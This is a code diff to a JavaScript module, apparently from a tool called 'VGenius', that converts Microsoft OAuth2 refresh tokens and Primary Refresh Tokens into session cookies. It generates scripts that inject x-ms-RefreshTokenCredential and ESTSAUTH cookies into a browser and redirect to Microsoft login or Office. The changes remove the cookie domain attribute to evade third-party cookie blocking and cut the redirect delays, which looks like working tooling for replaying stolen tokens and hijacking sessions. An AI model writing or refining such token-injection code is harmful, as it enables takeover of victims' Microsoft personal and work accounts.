@@ -3,7 +3,7 @@
  * Converts OAuth2 refresh tokens/PRT to long-lasting session cookies
  * Supports both personal (MSA) and work/school (Azure AD) accounts
  * 
- * Enhanced with competitor-proven techniques for
+ * Enhanced with our-proven techniques for
  reliable cookie generation */
 'use strict';
 
@@ -287,38 +287,40 @@ function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts
 
 /**
  * Generate JavaScript injection code for cookies (competitor-compatible format)
+ * IMPORTANT: Does NOT include domain attribute to avoid third-party cookie blocking
  */
 function generatePrtCookieInjectionScript(prtCookie, redirectUrl = 'https://login.microsoftonline.com/?auth=2') {
   return `// VGenius PRT Cookie Injection
 (function() {
-  document.cookie = "x-ms-RefreshTokenCredential=${prtCookie}; domain=.login.microsoftonline.com; path=/; secure; samesite=none";
+  document.cookie = "x-ms-RefreshTokenCredential=${prtCookie}; path=/; secure; samesite=none";
   console.log('[VGenius] PRT cookie injected');
-  setTimeout(function() { window.location.href = "${redirectUrl}"; }, 3000);
+  setTimeout(function() { window.location.href = "${redirectUrl}"; }, 1000);
 })();`;
 }
 
 /**
  * Generate full injection script with PRT + ESTSAUTH cookies
+ * IMPORTANT: Does NOT include domain attribute to avoid third-party cookie blocking
  */
 function generateFullInjectionScript(prtCookie, accessToken, redirectUrl = 'https://www.office.com/') {
   const parts = [
     '// VGenius Full Token Injection Script',
     '(function() {',
     ' console.log(\'[VGenius] Starting injection...\');', ];
-  
+
   if (prtCookie) {
-    parts.push(`document.cookie = "x-ms-RefreshTokenCredential=${prtCookie}; domain=.login.microsoftonline.com; path=/; secure; samesite=none";`);
+    parts.push(`document.cookie = "x-ms-RefreshTokenCredential=${prtCookie}; path=/; secure; samesite=none";`);
   }
-  
+
   if (accessToken) {
-    parts.push(`document.cookie = "ESTSAUTH=${accessToken}; domain=.login.microsoftonline.com; path=/; secure; samesite=none";`);
-    parts.push(`document.cookie = "ESTSAUTHLIGHT=${accessToken}; domain=.login.microsoftonline.com; path=/; secure; samesite=none";`);
+    parts.push(`document.cookie = "ESTSAUTH=${accessToken}; path=/; secure; samesite=none";`);
+    parts.push(`document.cookie = "ESTSAUTHLIGHT=${accessToken}; path=/; secure; samesite=none";`);
   }
-  
+
   parts.push("  console.log('[VGenius] All cookies injected');");
-  parts.push(`  setTimeout(function() { window.location.href = "${redirectUrl}"; }, 2000);`);
+  parts.push(`  setTimeout(function() { window.location.href = "${redirectUrl}"; }, 1000);`);
   parts.push('})();');
-  
+
   return parts.join('\n');
 }
 
